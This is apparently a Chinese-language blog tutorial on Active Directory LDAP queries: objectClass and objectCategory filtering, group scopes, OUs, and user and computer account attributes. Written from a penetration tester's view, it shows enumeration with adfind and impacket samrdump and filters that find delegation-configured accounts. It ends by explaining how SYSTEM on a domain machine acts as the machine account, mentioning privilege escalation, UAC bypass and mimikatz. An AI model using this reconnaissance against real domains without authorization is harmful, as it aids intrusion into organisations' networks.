<p>根据语法，我们就可以构造以下过滤规则</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(userAccountControl:<span class="number">1.2</span><span class="number">.840</span><span class="number">.113556</span><span class="number">.1</span><span class="number">.4</span><span class="number">.803</span>:=<span class="number">524288</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c5398334f0cf98cc.png"></p>
<p>但是这种我们还得去记BitFilterRule，于是adfind提供了一个更为快捷的方式。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0164df9cd980f63284.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f02a9998557b012d.png"></p>
<h4 id="LDAP-查找中的objectCategory和objectClass"><a href="#LDAP-查找中的objectCategory和objectClass" class="headerlink" title="LDAP 查找中的objectCategory和objectClass"></a>LDAP 查找中的objectCategory和objectClass</h4><ol>
<li>objectClass</li>
</ol>
<p>在前面一节里面说过,在对象的<code>objectClass</code> 属性里面，可以看到这个对象是哪个类的实例，以及这个类的所有父类，比如说<code>CN=jane,CN=Users,DC=test,DC=local</code>的<code>objectClas</code>s是<code>top,person,organizationalPerson,user</code>。那我们通过过滤语句(<code>objectClass=user</code>),(<code>objectClass=organizationalPerson</code>)都能找到这个对象。</p>
<p>所有的类都是top类的子类。因此当我们过滤(<code>objectClass=top</code>)可以找到域内的所有对象</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c5cb3e1fd94ba736.png"></p>
<ol start="2">
<li>objectCategory</li>
</ol>
<p>在Windows Server 2008之前默认不对objectClass 属性进行索引。最初认为对多值属性(例如object Class)进行索引会导致性能下降。如此一来，Windows 2000 附带了未索引的objectClass 属性和另一个已建立索引的单值属性，称为objectCategory。</p>
<p>接下来介绍下<code>objectCategory</code>这个属性。对象类的每个实例还具有一个objectCategory属性，该属性是一个单值属性。并且建立了索引。其中包含对象是其实例的类或其父类之一的专有名称。</p>
<p>比如说<code>CN=jane,CN=Users,DC=test,DC=local.</code>他的<code>objectCategory</code>是<code>CN=Person,CN=Schema,CN=Configuration,DC=test,DC=local</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ac37d1cab9e83560.png"></p>
<p>创建对象时，系统会将其objectCategory属性设置为由其对象类的defaultObjectCategory属性指定的值。无法更改对象的objectCategory属性。</p>
<p>如果我们想过滤所有objectCategory的属性为<code>CN=Person,CN=Schema,CN=Configuration,DC=test,DC=local</code>的对象，这个很简单。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(objectCategory=<span class="string">&quot;CN=Person,CN=Schema,CN=Configuration,DC=test,DC=local&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0148aa8b968c0d3557.png"></p>
<p>但是这样，又有点不方便，需要记住记住类的DN，所以LDAP在实现上实现了个小技巧。对象类有个属性lDAPDisplayName，指定他的显示名。事实上，我们看objectClass属性里面的类以及父类(比如top.person)，他的名字都是这个类的lDAPDisplayName</p>
<p>CN&#x3D;Person,CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;test,DC&#x3D;local的lDAPDisplayName是person.所以LDAP在实现上，支持用类的lDAPDisplayName作为搜索条件。所以如果我们想找所有CN&#x3D;Person,CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;test,DC&#x3D;local的实例，可以我简化为以下过滤规则。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(objectCategory=person)</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012cd00a23567d7e63.png"></p>
<ol start="3">
<li>objectClass与objectCategory的结合使用</li>
</ol>
<p>如果想确保查询在所有版本的Active Directory上都能正常运行，建议使用 objectClass 和objectCategory结合。如果在目录中已经索引了ObjectClass ，或者所有域控制器都在运行Windows Server 2008或更高版本，则可以随意􏰁使用 objectClass，而不必担心会对性能产生影响。</p>
<p>这里我们介绍下objectClass 和objectCategory的集合使用。前面我们分别介绍了objectClass 以及objectCategory，但是没讲怎么把他们结合在一起使用。</p>
<p>我们这里再来理一理思路。</p>
<p>CN&#x3D;jane,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;local这个对象。</p>
<p>他的objectClass是top,person,organizationalPerson,user。</p>
<p>他的objectCategory是person。</p>
<p>一个对象的objectClass 是一个类的对象类，以及这个对象类的所有父类。</p>
<p>一个对象的objectCategory 是一个类的对象类或者这个对象类的所有父类。</p>
<p>所以说一个对象的objectCategory 必定是objectClass 中的其中一个。</p>
<p>user，person，organizationalPerson类将其defaultObjectCategory设置为person。这允许像（objectCategory&#x3D; person）这样的搜索过滤器通过单个查询定位所有这些类的实例。</p>
<p>比如说，我们要定位所有的user 类的实例。(CN&#x3D;jane,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;local就是user类的一个对象)</p>
<p>user 类的继承关系如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">top =&gt; person =&gt; organizationalPerson =&gt; user</span><br></pre></td></tr></table></figure>

<p>那person,organizationalPerson,user都将其defaultObjectCategory设置为person。因此我们可以先过滤。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(objectCategory=person)</span><br></pre></td></tr></table></figure>

<p>但是这样的结果并不精准。我们使用objectClass进一步在过滤后的结果进行过滤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(&amp;(objectCategory=person)(objectClass=user))</span><br></pre></td></tr></table></figure>

<p>这样就能精准匹配到了。其实说通俗点就是，objectCategory建立索引，所以查询时间比较快。我们通过objectCategory划分一个大的范围，然后通过objectClass进行精准匹配。</p>
<p>当然如果在目录中已经索引了ObjectClass ，或者所有域控制器都在运行Windows Server 2008或更高版本，我们直接使用 objectClass((objectClass&#x3D;user))也能很精准地匹配并且不用考虑效率问题。</p>
<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><h4 id="组介绍"><a href="#组介绍" class="headerlink" title="组介绍"></a>组介绍</h4><p>在域内，我们无时无刻不在跟组打交道，比如我们熟悉的域管，就是一个组。按照用途来分，组分为通讯组和安全组。对于通讯组，我们接触的比较多的就是邮件组，将若干个人划分到一个通讯组，给这个通讯组发件，那组内用户都能收到。但是通讯组不能控制对资源的访问，我们并不是很在意。这篇文章侧重介绍安全组。</p>
<p>安全组是权限的集合。举个例子，运维需要对公司的网络进行管理，需要一些特殊的管理权限，我们就可以设置个组，对组配置权限。然后将运维拉近组里面，组里面的运维就拥有了该权限。安全组可以根据作用范围划分为。</p>
<ul>
<li>全局组 (Global group)</li>
<li>通用组(Universal group)</li>
<li>域本地组(Domain Local group)</li>
</ul>
<h4 id="查询组"><a href="#查询组" class="headerlink" title="查询组"></a>查询组</h4><p>所有的组都是group类的实例，</p>
<p>我们可以用(objectClass&#x3D;group)或者(objectCategory&#x3D;group)来过滤组。</p>
<p>如果需要考虑效率建议使用,正如前面所说objectCategory有建立索引。而objectClass在08之前并没有建立索引。</p>
<p>那为啥不需要objectClass 和objectCategory配合使用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011b5424450893b730.png"></p>
<p>我们之前说了，一般配合使用的场景都是通过objectCategory匹配划分一个大的范围，然后通过objectClass进行精准匹配。这里面通过objectCategory匹配到的已经是很精准了，就不需要再精准匹配了。</p>
<p>组的类型由属性groupType决定，属性groupType是一个位字段</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a600d38d7d392407.png"></p>
<p>现在我们搜索一下</p>
<ul>
<li>查询域内的所有组</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0171a765ba2b0bf2c8.png"></p>
<ul>
<li>域内的所有全局组</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01dc814a8f7aa8dd4e.png"></p>
<ul>
<li>域内的所有通用组</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0107aad27ffae6a2a6.png"></p>
<ul>
<li>域内的所有域本地组</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d4bab2775bb4dc9f.png"></p>
<ul>
<li>域内的所有安全组，包括全局组，通用组，域本地组</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014167dc8f912e9838.png"></p>
<ul>
<li>域内的所有通讯组，不属于安全组的组都是通讯组</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fe060255e6e161dd.png"></p>
<ul>
<li>域内系统创建的群组</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01aa36df937822d37e.png"></p>
<h4 id="组范围"><a href="#组范围" class="headerlink" title="组范围"></a>组范围</h4><p>之前说过安全组可以根据作用范围划分为。</p>
<ul>
<li>全局组 (Global group)</li>
<li>通用组(Universal group)</li>
<li>域本地组(Domain Local group)</li>
</ul>
<p>下面来详细介绍下</p>
<p>先看个表格，比较下三个组。</p>
<table>
<thead>
<tr>
<th align="center">组类型</th>
<th align="center">可以授予权限</th>
<th align="center">可包含</th>
<th align="center">可包含于</th>
<th align="center">成员是否在全局编录复制</th>
</tr>
</thead>
<tbody><tr>
<td align="center">全局组</td>
<td align="center">在同一林中或信任域或林中的任何域上</td>
<td align="center">来自同一域的帐户<br />来自同一域的其他全局组</td>
<td align="center">来自同一林中任何域的通用组<br />来自同一域的其他全局组<br />来自同一林中任何域或任何信任域的域本地组</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">通用组</td>
<td align="center">在同一林或信任林中的任何域上</td>
<td align="center">来自同一林中任何域的帐户<br />来自同一林中任何域的全局组<br />来自同一林中任何域的其他通用组</td>
<td align="center">同一林中的其他通用组<br />在同一个林或信任林中域本地组</td>
<td align="center">是</td>
</tr>
<tr>
<td align="center">域本地组</td>
<td align="center">在同一个域中</td>
<td align="center">来自任何域或任何受信任域的帐户<br />来自任何域或任何受信任域的全局组<br />来自同一林中任何域的通用组<br />来自同一域的其他域本地组</td>
<td align="center">来自同一域的其他域本地组</td>
<td align="center">无</td>
</tr>
</tbody></table>
<p>为了更直观，画了个图</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01055abab75530a0ba.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f9bccd2a8814565c.png"></p>
<p>接下来详细介绍下三个组</p>
<ul>
<li>域本地组(Domain Local group)</li>
</ul>
<p>顾名思义，就是本域内的本地组。不适用于林，适用于本域。可包含林内的账户，通用组，全局组。其他域内的通用组要在本域拥有权限，一般都是加入这个域的域本地组。比如说一个林里面，只有林根域有Enterprise Admins这个组，这是个通用组。然后其他子域 的域本地组Administrators会把林根域的Enterprise Admins加进里面，所以林根域的Enterprise Admins组用户才在整个林内具备管理员权限。如果想要一个只允许访问同一个域中的资源的组，那么使用域本地组即可。</p>
<ul>
<li>通用组(Universal group)</li>
</ul>
<p>上面已经简单提过了通用组，典型例子是Enterprise Admins这个组。在林的场景下比较有用。组内成员会在GC内复制。如果你想要一个可以访问林中任何东西的组，并且可以在林中包含任何账户，请使用通用组。</p>
<ul>
<li>全局组 (Global group)</li>
</ul>
<p>全局组比较复杂，前面说了。在单域内用域本地组，在林中使用通用组。全局组应该说是一种比较折中的方案，他可以在林中使用，但是只能包含本域内的账户。全局组的使用范围是本域以及受信任关系的其他域。最为常见的全局组是Domain Admin，也就是我们常说的域管。因为全局组只能包含本域内账户，因此来自一个域的账户不能嵌套在另一个域中的全局组中，这就是为什么来自同一个域的用户不符合在外部域中的域管的成员资格（由于其全局范围的影响)。</p>
<h4 id="常见组介绍"><a href="#常见组介绍" class="headerlink" title="常见组介绍"></a>常见组介绍</h4><ul>
<li><p>Administrators<br>域本地组。具备系统管理员的权限，拥有对整个域最大的控制权，可以执行整个域的管理任务。Administrators包括Domain Admins和Enterprise Admins。</p>
</li>
<li><p>Domain Admins<br>全局组。我们常说的域管组。默认情况下，域内所有机器会把Domain Admins加入到本地管理员组里面。</p>
</li>
<li><p>Enterprise Admins<br>通用组。在林中，只有林根域才有这个组，林中其他域没有这个组，但是其他域默认会把这个组加入到本域的Administrators里面去。</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018dfec26bdc6b4a87.png"></p>
<ul>
<li>Domain Users</li>
</ul>
<p>全局组。包括域中所有用户帐户,在域中创建用户帐户后，该帐户将自动添加到该组中。默认情况下，域内所有机器会把Domain Users加入到本地用户组里面，也就是为什么默认情况底下，啥都不配置。域用户可以登录域内任何一台普通成员机器。</p>
<p>更多的常见组，会在后续要使用到的时候进行介绍，这里不一一介绍了。</p>
<h4 id="AGDLP"><a href="#AGDLP" class="headerlink" title="AGDLP"></a>AGDLP</h4><p>安全组是权限的集合，所以在微软的建议中，并不建议给赋予单个用户权限，而是赋予一个组权限，然后将成员拉近组。下面介绍下AGDLP策略。这里直接用网上的图。</p>
<ul>
<li>A表示用户账号，Account</li>
<li>G表示全局组，Global group </li>
<li>U表示通用组，Universal Group</li>
<li>L表示本地组， local group</li>
<li>DL表示域本地组，Domain local group</li>
<li>P表示资源权限，Resource Permissions</li>
</ul>
<p>有常见的几种权限划分方式</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011b7307be86d9898d.jpg"></p>
<ul>
<li>AGP，将用户账户添加到全局组，然后赋予全局组权限</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0144ea8fd9fdcfd13c.jpg"></p>
<ul>
<li>AGLP，将用户账户添加到全局组，将全局组添加到本地组， 然后赋予本地组权限</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019d2b13a12e69594c.jpg"></p>
<ul>
<li>ADLP 将用户账户添加到域本地组，然后赋予域本地组权限</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b30769e58bc30d1b.jpg"></p>
<ul>
<li>AGDLP，将用户账户添加到全局组，将全局组添加到域本地组， 然后赋予域本地组权限</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ca031e9e49db2bf2.jpg"></p>
<ul>
<li>AGUDLP，将用户账户添加到全局组，将全局组添加到通用组，将通用组添加到域本地组， 然后赋予域本地组权限</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01785b14c5c4f449c4.jpg"></p>
<h4 id="查询组内用户以及用户所属的组"><a href="#查询组内用户以及用户所属的组" class="headerlink" title="查询组内用户以及用户所属的组"></a>查询组内用户以及用户所属的组</h4><p>如果group4 是group2 组内的成员</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c750503380ac36ca.png"></p>
<p>那么<code>group2</code>有个属性<code>member</code> 标识<code>group4</code>是它的成员。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f9d11ec6871c7e37.png"></p>
<p><code>group4</code>有个属性<code>memberOf</code> 标识它是<code>group2</code>的成员</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d9d14162b0253092.png"></p>
<p>根据这两个属性，我们就可以开始过滤了。</p>
<p>我们举个例子。</p>
<p>在我们有四个组(group1,group2,group3,group4)，一个用户(it-1)。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c257fa2f518e22b3.png"></p>
<p>上面箭头意思是组成员</p>
<p>group1 这个组里面有一个成员group2</p>
<p>group2 这个组里面有两个个成员group4和it-1</p>
<p>group3 这个组里面有一个成员it-1</p>
<p>那我们开始进行搜索。</p>
<ol>
<li>查看group2有哪些成员</li>
</ol>
<p>最简单的，查看group2 这个对象的member属性</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec9f57dab20b58fc.png"></p>
<p>或者过滤memberOf为group2的所有对象</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0190ce78fc0b557d84.png"></p>
<ol start="2">
<li>查看<code>it-1</code> 属于哪些组</li>
</ol>
<p>最简单的，查看<code>it-1</code> 这个对象的<code>memberOf</code>属性</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0131d13d84190baa42.png"></p>
<p>或者过滤<code>member</code>为<code>it-1</code>的所有对象</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f070b51f25409685.png"></p>
<ol start="3">
<li>查看group1有哪些成员，这些成员如果是组，就继续查下去，知道非组成员为止。</li>
</ol>
<p>上面两个都比较好理解，接下来，我们来分析一下。</p>
<p>在这里</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c257fa2f518e22b3.png"></p>
<p>如果仅仅是查group1有哪些成员,那就只有group2，但是我们现在的需求是递归查下去，group2也是一个组，组内又有哪些成员。从图中我们可以看出有group2,group4,it-1</p>
<p>这里LDAP 给我们提供一个特性，也是位操作符的一部分。BitFilterRule-ID 为1.2.840.113556.1.4.1941.在adfind 里面可以用INCHAIN简化。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0164df9cd980f63284.png"></p>
<p>现在我们开始查group1的所有成员，以及成员的成员,…。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019b2f52e776633274.png"></p>
<ol start="4">
<li>查看it-1 属于哪些组，这些组又属于哪些组，如此往上递归查询，直到这个组不属于其他组。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c257fa2f518e22b3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f10c14520955c893.png"></p>
<h3 id="组织单位-Organization-Unit"><a href="#组织单位-Organization-Unit" class="headerlink" title="组织单位(Organization Unit)"></a>组织单位(Organization Unit)</h3><h4 id="OU介绍"><a href="#OU介绍" class="headerlink" title="OU介绍"></a>OU介绍</h4><p>组织单位(Organization Unit)，简称OU，是一个容器对象，将域中的对象组织成逻辑组，帮助网络管理员简化管理组。组织单位包含下列类型的对象：用户，计算机，工作组，打印机，安全策略，其他组织单位等。可以在组织单位基础上部署组策略，统一管理组织单位中的域对象。 在企业域环境里面，我们经常看到按照部分划分的一个个OU。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018e25ce8bb961e519.png"></p>
<h4 id="OU跟容器的区别"><a href="#OU跟容器的区别" class="headerlink" title="OU跟容器的区别"></a>OU跟容器的区别</h4><p>组织单位（OU）是专用容器，与常规容器的区别在于管理员可以将组策略应用于OU，然后系统将其下推到OU中的所有计算机。您不能将组策略应用于容器。需要注意的是Domain Computers是一个普通容器，而Domain Controllers是一个OU，因此可以可以将组策略应该于Domain Controllers，不可以将组策略应用于Domain Computers。关于更多组策略的内容，我们后面会专门有一篇文章介绍组策略。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017aff0c5b28d0d0d6.png"></p>
<p>PS：上面说的<code>Domain Computers</code>和<code>Domain Controllers</code>特指根域的,不是User容器底下的，那个是组</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a829f32fb734d85b.png"></p>
<h4 id="OU跟组的区别"><a href="#OU跟组的区别" class="headerlink" title="OU跟组的区别"></a>OU跟组的区别</h4><p>组织单位跟组是两个完全不同的概念。很多人经常会把这两个弄混。组是权限的集合。OU是管理对象的集合。举个前面举过的例子，运维需要对公司的网络进行管理，需要一些特殊的管理权限，我们就可以设置个组，对组配置权限。然后将运维拉近组里面，组里面的运维就拥有了该权限。比如我们需要对财务部里面的用户进行统一管理，那我们可以设置个OU，然后把财务部的用户拉近这个OU，这样就可以进行集中管理，比如说下发组策略。说通俗点，组是管理的集合，OU是被管理的集合。关于权限的更多内容，后面会有一块文章专门介绍。</p>
<h4 id="OU委派"><a href="#OU委派" class="headerlink" title="OU委派"></a>OU委派</h4><p>考虑这样一种需求，如果我们想允许某个用户把其他用户拉近OU，而不赋予这个用户域管权限，我们可以在这个OU给这个用户委派 添加成员的权限。组织单位的委派其实就是赋予某个域内用户对OU的某些管理权限。这些权限体现在ACL里面。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d44372bf257765d3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017e96021ac567c7b0.png"></p>
<h4 id="查询OU"><a href="#查询OU" class="headerlink" title="查询OU"></a>查询OU</h4><p>所有的OU都是<code>organizationalUnit</code>类的实例，</p>
<p>我们可以用<code>(objectClass=organizationalUnit)</code>或者<code>(objectCategory=organizationalUnit)</code>来过滤OU。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0186abe203e4176784.png"></p>
<p>查询OU里面的账户，可以指定BaseDN为OU就行</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013c9e0b67adb0a985.png"></p>
<h2 id="域用户和计算机用户介绍"><a href="#域用户和计算机用户介绍" class="headerlink" title="域用户和计算机用户介绍"></a>域用户和计算机用户介绍</h2><h3 id="前言-10"><a href="#前言-10" class="headerlink" title="前言"></a>前言</h3><p>这块主要介绍AD里面的域用户，计算机用户。</p>
<h3 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h3><h4 id="查询域用户"><a href="#查询域用户" class="headerlink" title="查询域用户"></a>查询域用户</h4><p>当我们拥有一个域用户的时候，想要枚举域内的所有用户，主要有两个方法。</p>
<ol>
<li>通过SAMR 协议查询</li>
</ol>
<p>samr 也不算是一种专门的协议，就是一个RPC接口(这里简单地提一下。后面在RPC篇里面详细介绍这个RPC接口)</p>
<p>我们平时使用的<code>net user /domain</code>就是使用samr 进行查询的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018c6fd3bd4c6ef7a1.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d107c16808abfd22.png"></p>
<p>在impacket 里面有一个脚本<code>samrdump.py</code>就是专门调用samr 去查询域用户的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018028b408c5d194aa.png"></p>
<ol start="2">
<li>通过Ldap 语法查询</li>
</ol>
<p>域用户存储于活动目录数据库里面，对其他用户可见。可以通过Ldap 去查询。</p>
<p>过滤语法如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(&amp;(objectCategory=person)(objectClass=user))</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014941fa87a014a8c8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01eb716a3d86ac3472.png"></p>
<h3 id="域用户部分属性介绍"><a href="#域用户部分属性介绍" class="headerlink" title="域用户部分属性介绍"></a>域用户部分属性介绍</h3><ul>
<li>相关的用户名</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e758a060febfa6d5.png"></p>
<p>​这些属性在LDAP 里面都可以查看</p>
<ol>
<li>姓对应的属性就是sn</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016c9fef00b33a758a.png"></p>
<ol start="2">
<li>名对应的属性是giveName</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f453345c0ad7081d.png"></p>
<ol start="3">
<li>展示名，对应的属性是displayName</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ea42cdbe36e24d86.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d7a7f559f834fe2e.png"></p>
<p>值得注意的是，displayName不能用于登陆，虽然跟域用户名往往一样。但是这个不是直接用于登陆的我们登陆用的账号，在一些公司里面，displayName往往是中文，登陆的用户名是拼音。登陆的格式有以下两种格式。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0188d6994cbdbc4240.png"></p>
<ol start="4">
<li>第一种格式是UserPrincipalName，我们简称为UPN，一般的格式是用户名@域名这样的格式。<br>​<br>比如这里就是<a href="mailto:&#108;&#x69;&#x73;&#105;&#x40;&#x74;&#x65;&#115;&#x74;&#46;&#108;&#x6f;&#99;&#x61;&#x6c;">&#108;&#x69;&#x73;&#105;&#x40;&#x74;&#x65;&#115;&#x74;&#46;&#108;&#x6f;&#99;&#x61;&#x6c;</a></li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e2811e15d3228c71.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b73488011e5e86a7.png"></p>
<ol start="5">
<li>第二种格式是域名\sAMAccountName这种格式</li>
</ol>
<p>比如这里就是test.local\lisi，这里的域名可以是netbios名，也可以是dns 名。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01595f47ef69ceef69.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011ca5405da92980fc.png"></p>
<p>用户相关的一些时间:</p>
<ul>
<li>whenCreated</li>
<li>pwdLastSet</li>
<li>Lastlogon</li>
</ul>
<p>看名字就可以大约猜出这些字段的含义了。账号创建时间，设置密码时间，上次登录时间，这些属性任意域用户都可以看的到。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e4f40a06b74baebe.png"></p>
<p>只是这个并不直观，adfind 提供了转化</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01191e56d60c6d910b.png"></p>
<p>这样更直观一点</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f824a499187bbbd1.png"></p>
<p>值得注意的是<strong>Lastlogon</strong>这个属性值在不同的域控制器上是不会同步的。所以要查询一个用户的最后登录时间，得指定不同的域控制器来查询。</p>
<ul>
<li>userAccountControl</li>
</ul>
<p>在上一篇，讲位操作的时候有简单提及到这个<code>userAccountControl</code>，其实这个属性至关重要。在整个文章里面反复提及。userAccountControl对应的位如下。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014df9519f018df4a7.png"></p>
<p>我们可以利用ldap的位操作(关于Ldap的位操作见<a href='#p9'>LDAP篇之组和OU介绍</a>)来一个个过滤。</p>
<p>比如，我们想查询查询密码永不过期的用户。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01461760288349e774.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a2c4d034684a042b.png"></p>
<p>又比如，我们想查询设置了约束委派的用户。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e117778c9f171747.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b5137b62844c9a49.png"></p>
<p>又比如，我们想查询域内设置了对委派敏感的用户。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e07d11b4d72c67f4.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0162b49a36e774d790.png"></p>
<p>等等等。大家可以查表，然后更改对应的十进制值来过滤。</p>
<h3 id="机器用户"><a href="#机器用户" class="headerlink" title="机器用户"></a>机器用户</h3><p>默认情况底下，加入域的机器默认在CN&#x3D;Computer这个容器里面，域控默认在Domain Controllers这个OU里面。有些域内会通过redircmp进行修改</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01556863664fc3e42d.png"></p>
<h4 id="机器用户跟system-用户的关系"><a href="#机器用户跟system-用户的关系" class="headerlink" title="机器用户跟system 用户的关系"></a>机器用户跟system 用户的关系</h4><p>考虑到这样一个场景，如果拿到一台域内机器，然后发现没有域内用户。 这个时候有很多人用mimikatz 抓一下，没抓到域用户，就束手无策了。</p>
<p>我们随便点开一台Domain Computer，这里以WIN7这台机子做为测试。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bdbdc91687c4d3d7.png"></p>
<p>我们看他的对象类。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01aef09a6b19f7a1de.png"></p>
<p>发现他是computer 类的实例。</p>
<p>而computer 类的user 类的子类。域用户是user类的实例。之前我们说过类是属性的集合。子类继承了父类的所有属性，因此域用户该有的属性，计算用户都有，甚至我们可以说，机器用户就是一种域用户。</p>
<p>那回到之前的那个问题，如果拿到一台域内机器，然后发现没有域内用户的情况。我们上面说了，机器用户其实就是一个域用户，那我们怎么使用这个机器用户呢。其实本地用户SYSTEM就对应于域内的机器用户，在域内的用户名就是机器名+$,比如win7，他的机器名是WIN7，那他在域内的登录名就是win7$,关于sAMAccountName我们在上一小节已经讲了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018f4edb0f65df5216.png"></p>
<p>所以我们可以将当前用户提到system(非管理员需要配合提权漏洞，管理员组的非administrators需要bypassuac，administrator提到system。这个网上有很多方法，psexec，mimikatz等等)。就可以在域内充当机器用户了。</p>
